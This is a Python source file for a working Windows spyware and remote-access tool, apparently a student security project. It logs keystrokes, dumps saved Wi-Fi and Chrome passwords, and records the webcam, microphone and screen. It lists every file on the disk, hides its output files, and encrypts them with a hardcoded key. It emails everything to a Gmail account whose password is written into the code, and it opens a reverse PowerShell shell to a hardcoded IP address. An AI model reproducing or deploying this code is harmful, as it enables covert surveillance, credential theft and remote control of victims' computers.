# Alot of help from https: // www.youtube.com/watch?v = 25um032xgrw
# https://pypi.org/project/pynput/

# pip install --upgrade google-api-python-client google-auth-httplib2 google-auth-oauthlib
# pip install pynput

#import os to install the necessary stuff on the persons computer

# https://stackoverflow.com/questions/12332975/installing-python-module-within-code/24773951#24773951
import pip
import os
import sys
import subprocess

# def install_and_import(package):
#     subprocess.check_call(["pip3", "install", package])

# install_and_import("pycryptodome")
# install_and_import("pycryptodomex")
# install_and_import("pypiwin32")
# install_and_import("pynput")
# install_and_import("psutil")
# install_and_import("gputil")
# install_and_import("tabulate")
# install_and_import("sounddevice")
# install_and_import("scipy")
# install_and_import("opencv-python")
# install_and_import("filesplit")
# install_and_import("pyautogui")
# install_and_import("fernet")
# install_and_import("requests")
# install_and_import("cryptography")




import sys
from datetime import timezone, datetime, timedelta
import platform
import requests
import csv
import json
import fernet


import logging
from pynput.keyboard import Key, Listener

import win32con, win32api
from fsplit.filesplit import Filesplit
from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText 
from email.mime.base import MIMEBase 
from email import encoders 
import smtplib
import threading 
import socket
import psutil
import GPUtil
from tabulate import tabulate
import sounddevice as sd
from scipy.io.wavfile import write
import sched
import time
import cv2

import shutil
from cryptography.fernet import Fernet
from Cryptodome.Cipher import AES
import win32crypt
import sqlite3
import base64

import pyautogui

import numpy as np
from socket import *
import struct




# Gloabl info
email_adress = 'alicomp6441@gmail.com'
email_adress_password = '5XY2Lq1iG0u9'


keys_information_file = "key_log.txt"
computer_info_file = "computer_log.txt"
computer_chrome_file = "chrome_passwords.txt"
computer_dir_file = "computer_directory.txt"
computer_wifi_file = "computer_wifi.txt"
split_manifest = "fs_manifest.csv"

keys_information_file_e = "key_loge.txt"
computer_info_file_e = "computer_loge.txt"
computer_chrome_file_e = "chrome_passwordse.txt"
computer_dir_file_e = "computer_directorye.txt"
computer_wifi_file_e = "computer_wifie.txt"

key = b'Zr4ZOn3AY2esAIynW0GikOpNh11mSrceQcol7IHAjx8='

# https://www.geeksforgeeks.org/getting-saved-wifi-passwords-using-python/
def wifi_passwords():
    # importing subprocess
    
    # getting meta data
    meta_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'])
    
    # decoding meta data
    data = meta_data.decode('utf-8', errors ="backslashreplace")
    
    # spliting data by line by line
    data = data.split('\n')
    
    # creating a list of profiles
    profiles = []
    with open(computer_wifi_file, "w") as f:
        win32api.SetFileAttributes(computer_wifi_file,win32con.FILE_ATTRIBUTE_HIDDEN)
        # traverse the data
        for i in data:
            
            # find "All User Profile" in each item
            if "All User Profile" in i :
                
                # if found
                # split the item 
                i = i.split(":")
                
                # item at index 1 will be the wifi name
                i = i[1]
                
                # formatting the name
                # first and last chracter is use less
                i = i[1:-1]
                
                # appending the wifi name in the list
                profiles.append(i)
                
        
        # printing heading        
        f.write("{:<30}| {:<}".format("Wi-Fi Name", "Password\n"))
        f.write("----------------------------------------------\n")
        
        # traversing the profiles        
        for i in profiles:
            
            # try catch block beigins
            # try block
            try:
                # getting meta data with password using wifi name
                results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear'])
                
                # decoding and splitting data line by line
                results = results.decode('utf-8', errors ="backslashreplace")
                results = results.split('\n')
                
                # finding password from the result list
                results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                
                # if there is passowrd it will print the pass word
                try:
                    f.write("{:<30}| {:<}\n".format(i, results[0]))
                
                # else it will print blank in fornt of pass word
                except IndexError:
                    f.write("{:<30}| {:<}\n".format(i, ""))
                    
                    
            # called when this process get failed
            except subprocess.CalledProcessError:
                f.write("Encoding Error Occured\n")
    encrypt_files(computer_wifi_file, computer_wifi_file_e)
    split_files_and_send_email(computer_wifi_file_e, "Wifi passwords")

##############################

# ALL IS STOLEN FROM
# https: // www.thepythoncode.com/article/extract-chrome-passwords-python
# ALL CREDIT GOES TO HIM IM JUST USING IT TO SHOW HOW EASILY I CAN STEAL DATA

def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)


def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI str
    key = key[5:]
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_password(password, key):
    try:
        # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""


def get_chrome_passwords():
    # get the AES key
    key = get_encryption_key()
    # local sqlite Chrome database path
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")
    # copy the file to another location
    # as the database will be locked if chrome is currently running
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    win32api.SetFileAttributes(filename,win32con.FILE_ATTRIBUTE_HIDDEN)
    # connect to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    # `logins` table has the data we need
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    # iterate over all rows
    with open(computer_chrome_file, "w") as f:
        win32api.SetFileAttributes(computer_chrome_file,win32con.FILE_ATTRIBUTE_HIDDEN)
        for row in cursor.fetchall():
            # print(row)
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]
            if username or password:
                f.write(f"Origin URL: {origin_url}\n")
                f.write(f"Action URL: {action_url}\n")
                f.write(f"Username: {username}\n")
                f.write(f"Password: {password}\n")
            else:
                continue
            if date_created != 86400000000 and date_created:
                f.write(f"Creation date: {str(get_chrome_datetime(date_created))}\n")
            if date_last_used != 86400000000 and date_last_used:
                f.write(f"Last Used: {str(get_chrome_datetime(date_last_used))}\n")
            f.write("="*50 + "\n")
    cursor.close()
    db.close()
    try:
        # try to remove the copied db file
        os.remove(filename)
    except:
            pass
    encrypt_files(computer_chrome_file, computer_chrome_file_e)
    split_files_and_send_email(computer_chrome_file_e, "chrome file")
###########






 


# https: // www.codespeedy.com/save-webcam-video-in-python-using-opencv/
def record_webcam():
    vid_capture = cv2.VideoCapture(0)
    vid_cod = cv2.VideoWriter_fourcc(*'mp4v')
    width = int(vid_capture.get(cv2.CAP_PROP_FRAME_WIDTH) + 0.5)
    height = int(vid_capture.get(cv2.CAP_PROP_FRAME_HEIGHT) + 0.5)
    output = cv2.VideoWriter("cam_video.mp4", vid_cod, 20.0, (width, height))
    win32api.SetFileAttributes("cam_video.mp4",win32con.FILE_ATTRIBUTE_HIDDEN)

    t_end = time.time() + 10
    
    while(1):
        # Capture each frame of webcam video
        ret, frame = vid_capture.read()
        if ret == True:
            frame = cv2.flip(frame, 0)

            # write the flipped frame
            output.write(frame)

            cv2.imshow('frame', frame)
        if  time.time() > t_end:
            break

    # close the already opened camera
    vid_capture.release()
    # close the already opened file
    output.release()
    # close the window and de-allocate any associated memory usage
    cv2.destroyAllWindows()
    encrypt_files("cam_video.mp4", "cam_video_e.mp4")
    split_files_and_send_email("cam_video_e.mp4", body="vid cam footage")

    



# https: // realpython.com/playing-and-recording-sound-python/
def record_audio():
    fs = 44100  # Sample rate
    seconds = 10
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    write('output.wav', fs, myrecording)  # Save as WAV file
    win32api.SetFileAttributes("output.wav",win32con.FILE_ATTRIBUTE_HIDDEN)
    encrypt_files("output.wav", "output_e.wav")
    split_files_and_send_email("output_e.wav", body="vid cam footage")

    # send this somewhere



#https://www.thepythoncode.com/article/get-hardware-system-information-python
# The below code is stolen from this website all credit to them
# also copied from psutil documentation

def get_size(bytes, suffix="B"):
    """
    Scale bytes to its proper format
    e.g:
        1253656 => '1.20MB'
        1253656678 => '1.17GB'
    """
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor


def secs2hours(secs):
    mm, ss = divmod(secs, 60)
    hh, mm = divmod(mm, 60)
    return "%d:%02d:%02d" % (hh, mm, ss)

def get_comp_info():
    hostname = gethostname()
    external_ip = requests.get("https://api.ipify.org").text
    uname = platform.uname()

    boot_time_timestamp = psutil.boot_time()
    bt = datetime.fromtimestamp(boot_time_timestamp)

    

    with open(computer_info_file, "w") as f:
        f.write("external ip" + external_ip + "\n\n")
        f.write("hostname" + hostname + "\n\n")
        f.write("uname" + str(uname) + "\n\n")
        f.write("="*40 + "Platform Info" + "="*40 + "\n")
        f.write(f"System: {uname.system}\n")
        f.write(f"Node Name: {uname.node}\n")
        f.write(f"Release: {uname.release}\n")
        f.write(f"Version: {uname.version}\n")
        f.write(f"Machine: {uname.machine}\n")
        f.write(f"Processor: {uname.processor}\n")
        f.write(f"Platform: {platform.platform()}\n")
        f.write("Hostname" + hostname + "\n")
        f.write("external_ip" + external_ip + "\n")
        f.write(
            f"Boot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}\n")

        f.write("="*40 + "CPU Info" + "="*40 + "\n")
        # number of cores
        f.write(f"Physical cores: {psutil.cpu_count(logical=False)}\n")
        f.write(f"Total cores: {psutil.cpu_count(logical=True)}\n")
        # CPU frequencies
        cpufreq = psutil.cpu_freq()
        f.write(f"Max Frequency: {cpufreq.max:.2f}Mhz\n")
        f.write(f"Min Frequency: {cpufreq.min:.2f}Mhz\n")
        f.write(f"Current Frequency: {cpufreq.current:.2f}Mhz\n")
        # CPU usage
        f.write("CPU Usage Per Core:\n")
        for i, percentage in enumerate(psutil.cpu_percent(percpu=True, interval=1)):
            f.write(f"Core {i}: {percentage}%\n")
        f.write(f"Total CPU Usage: {psutil.cpu_percent()}%\n")

        # Memory Information
        f.write("="*40 + "Memory Information" + "="*40 + "\n")
        # get the memory details
        svmem = psutil.virtual_memory()
        f.write(f"Total: {get_size(svmem.total)}\n")
        f.write(f"Available: {get_size(svmem.available)}\n")
        f.write(f"Used: {get_size(svmem.used)}\n")
        f.write(f"Percentage: {svmem.percent}%\n")
        f.write("="*20 + "SWAP" + "="*20 + "\n")
        # get the swap memory details (if exists)
        swap = psutil.swap_memory()
        f.write(f"Total: {get_size(swap.total)}\n")
        f.write(f"Free: {get_size(swap.free)}\n")
        f.write(f"Used: {get_size(swap.used)}\n")
        f.write(f"Percentage: {swap.percent}%\n")

        f.write("="*40 + "Network Information" + "="*40)

        # get all network interfaces (virtual and physical)
        if_addrs = psutil.net_if_addrs()
        for interface_name, interface_addresses in if_addrs.items():
            for address in interface_addresses:
                f.write(f"=== Interface: {interface_name} === \n")
                if str(address.family) == 'AddressFamily.AF_INET':
                    f.write(f"  IP Address: {address.address}\n")
                    f.write(f"  Netmask: {address.netmask}\n")
                    f.write(f"  Broadcast IP: {address.broadcast}\n")
                elif str(address.family) == 'AddressFamily.AF_PACKET':
                    f.write(f"  MAC Address: {address.address}\n")
                    f.write(f"  Netmask: {address.netmask}\n")
                    f.write(f"  Broadcast MAC: {address.broadcast}\n")
        f.write("DNS\n")
        # result = subprocess.check_output(['ipconfig /all | findstr /R ""DNS Servers""'])
        # f.write(result)
        f.write("IPCONFIG\n")
        result = subprocess.check_output(['ipconfig'])
        f.write(result.decode())
        # get IO statistics since boot
        net_io = psutil.net_io_counters()
        f.write(f"Total Bytes Sent: {get_size(net_io.bytes_sent)}\n")
        f.write(f"Total Bytes Received: {get_size(net_io.bytes_recv)}\n")

        f.write("="*40 + "Batter Information" + "="*40 + "\n")
        battery = psutil.sensors_battery()
        if battery:
            f.write("charge = %s%%, time left = %s\n" %
                (battery.percent, secs2hours(battery.secsleft)))


        # f.write("="*40 + "Temp Information" + "="*40 + "\n")
        # if psutil.sensors_temperatures():
        #     f.write(psutil.sensors_temperatures() + "\n")
        
        # f.write("="*40 + "Fan Information" + "="*40 + "\n")
        # if psutil.sensors_fans():
        #     f.write(psutil.sensors_fans() + "\n")
        
        f.write("="*40 + "Processes Information" + "="*40 + "\n")
        for proc in psutil.process_iter(['pid', 'name', 'username']):
            f.write(str(proc.info) + "\n")
        
        f.write("="*40 + "GPU Information" + "="*40 + "\n")
        gpus = GPUtil.getGPUs()
        list_gpus = []
        for gpu in gpus:
            # get the GPU id
            gpu_id = gpu.id
            # name of GPU
            gpu_name = gpu.name
            # get % percentage of GPU usage of that GPU
            gpu_load = f"{gpu.load*100}%"
            # get free memory in MB format
            gpu_free_memory = f"{gpu.memoryFree}MB"
            # get used memory
            gpu_used_memory = f"{gpu.memoryUsed}MB"
            # get total memory
            gpu_total_memory = f"{gpu.memoryTotal}MB"
            # get GPU temperature in Celsius
            gpu_temperature = f"{gpu.temperature} °C"
            gpu_uuid = gpu.uuid
            list_gpus.append((
                gpu_id, gpu_name, gpu_load, gpu_free_memory, gpu_used_memory,
                gpu_total_memory, gpu_temperature, gpu_uuid
            ))

        f.write(tabulate(list_gpus, headers=("id", "name", "load", "free memory", "used memory", "total memory",
                                        "temperature", "uuid")))
    win32api.SetFileAttributes(computer_info_file,win32con.FILE_ATTRIBUTE_HIDDEN)
    encrypt_files(computer_info_file, computer_info_file_e)

    split_files_and_send_email(computer_info_file_e, "Computer info")




# send the info via email to myself
def send_email(filename, body="Just sending some info", toaddr="ahsangr831@gmail.com",):
    fromadrr = email_adress
    msg= MIMEMultipart()
    msg['From'] = fromadrr
    msg['To'] = toaddr
    msg['Subject'] = "Log file"
    body = body
    msg.attach(MIMEText(body,"plain"))

    filename = filename
    attachment = open(filename, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    attachment.close()
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    text = msg.as_string()

    # print(text)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromadrr, email_adress_password)
    s.sendmail(fromadrr, toaddr, text)
    s.quit()







def  split_files_and_send_email(filename, body = "Some info"):
    if os.stat(filename).st_size<=24500000:
        send_email(filename, body)
        os.remove(filename)
        return
   
    fs = Filesplit()
    fs.split(filename, split_size = 24500000)
    os.remove(filename)
    # https://stackoverflow.com/questions/30523943/how-to-read-just-the-first-column-of-each-row-of-a-csv-file
    list2 = []
    with open(split_manifest, "r+") as f:
        win32api.SetFileAttributes(split_manifest,win32con.FILE_ATTRIBUTE_HIDDEN)
        reader = csv.reader(f, delimiter="\t")
        for i, j in enumerate(reader):
            if j != [] and i != 0:
                # print (j[0].split(",")[0])
                list2.append(j[0].split(",")[0])
    os.remove(split_manifest)
    for f in list2:
        win32api.SetFileAttributes(f,win32con.FILE_ATTRIBUTE_HIDDEN)
    for f in list2:
        send_email(f, body = body)
        os.remove(f)

    
def screenshot():
    image = pyautogui.screenshot()
    image = cv2.cvtColor(np.array(image),
                     cv2.COLOR_RGB2BGR)
    cv2.imwrite("screenshot.png", image)
    encrypt_files("screenshot.png", "screenshot_e.png")
    split_files_and_send_email("screenshot_e.png", "screenshot")
    



#https://stackoverflow.com/questions/120656/directory-tree-listing-in-python
def get_directories():
    with open(computer_dir_file, "w") as f:
        win32api.SetFileAttributes(computer_dir_file,win32con.FILE_ATTRIBUTE_HIDDEN)
        for root, dirs, files in os.walk("\\", topdown=False):
            for name in files:
                f.write(os.path.join(root, name))
            for name in dirs:
                f.write(os.path.join(root, name))
    encrypt_files(computer_dir_file, computer_dir_file_e)
    split_files_and_send_email(computer_dir_file_e, body = "comp directory")


def start_logging():
    while (1):
        global currentTime
        global stoppingTime
        currentTime = time.time()
        stoppingTime = time.time() + 60

        # https://stackoverflow.com/questions/24816456/python-logging-wont-shutdown

        log = logging.getLogger()
        log.setLevel(logging.INFO)
        fh = logging.FileHandler(filename=keys_information_file)
        fh.setLevel(logging.INFO)
        formatter = logging.Formatter(
                        fmt='%(asctime)s %(levelname)s: %(message)s',
                        datefmt='%Y-%m-%d %H:%M:%S'
                        )
        fh.setFormatter(formatter)
        log.addHandler(fh)

        win32api.SetFileAttributes(keys_information_file,win32con.FILE_ATTRIBUTE_HIDDEN)


        while currentTime < stoppingTime:
            global end_prog
            end_prog = False
            def on_press(key):
                global currentTime
                currentTime = time.time()
                # print(key)
                logging.info(key)

            def on_release(key):
                #logging formatting
                global end_prog
                # print("release")
                if key == Key.esc:
                    # print("end prog true")
                    logging.shutdown()
                    end_prog = True
                    return False
                if currentTime > stoppingTime:
                        return False
                
            with Listener(
                on_press=on_press,
                on_release=on_release) as listener:
                listener.join()
            # print(end_prog, currentTime > stoppingTime, currentTime, stoppingTime)
            if currentTime > stoppingTime:
                screenshot()
                record_audio()
                record_webcam()
                log.removeHandler(fh)
                del log,fh
                encrypt_files(keys_information_file, keys_information_file_e)
                split_files_and_send_email(keys_information_file_e, "key log")
            elif end_prog == True:
                log.removeHandler(fh)
                del log,fh
                os.remove(keys_information_file)
                # os.remove("somethingawesome.pyw")
                print("exit from therad")
                os._exit(1)

# https://stackoverflow.com/questions/17667903/python-socket-receive-large-amount-of-data

def send_msg(sock, msg):
    # Prefix each message with a 4-byte length (network byte order)
    msg = struct.pack('>I', len(msg)) + msg
    sock.sendall(msg)

def recv_msg(sock):
    # Read message length and unpack it into an integer
    raw_msglen = recvall(sock, 4)
    if not raw_msglen:
        return None
    msglen = struct.unpack('>I', raw_msglen)[0]
    # Read the message data
    return recvall(sock, msglen)

def recvall(sock, n):
    # Helper function to recv n bytes or return None if EOF is hit
    data = bytearray()
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data.extend(packet)
    return data


def encrypt_files(file, file_e):
    with open(file, 'rb') as f:
        data = f.read()
    
    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)
    with open(file_e, 'wb') as f:
        f.write(encrypted)
    os.remove(file)

    win32api.SetFileAttributes(file_e,win32con.FILE_ATTRIBUTE_HIDDEN)

    

def getting_info():
    wifi_passwords()
    get_comp_info()
    get_chrome_passwords()


def command_prompt():
    client = socket(AF_INET, SOCK_STREAM)
    client.connect(("14.202.65.249", 12000))

    while(1):
        data = recv_msg(client)
        # print(data)
        data = data.decode()
        # print(data)
        # print(data)

        try:
            result = subprocess.check_output(["powershell", "-Command", data], shell=True, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
            # print(result)
        except Exception as e:
            result = str(e).encode()
        # result is already in binary 
        send_msg(client, result)
        
if __name__ == "__main__":

    log_thread = threading.Thread(target = start_logging)
    log_thread.daemon = True 
    log_thread.start()

    dir_thread = threading.Thread(target = get_directories)
    dir_thread.daemon = True 
    dir_thread.start()

    info_thread = threading.Thread(target = getting_info)
    info_thread.daemon = True 
    info_thread.start()

    command_thread = threading.Thread(target = command_prompt)
    command_thread.daemon = True 
    command_thread.start()

    while(1):
        log_thread.join()
        dir_thread.join()
        info_thread.join()
        command_thread.join()




    


    
        


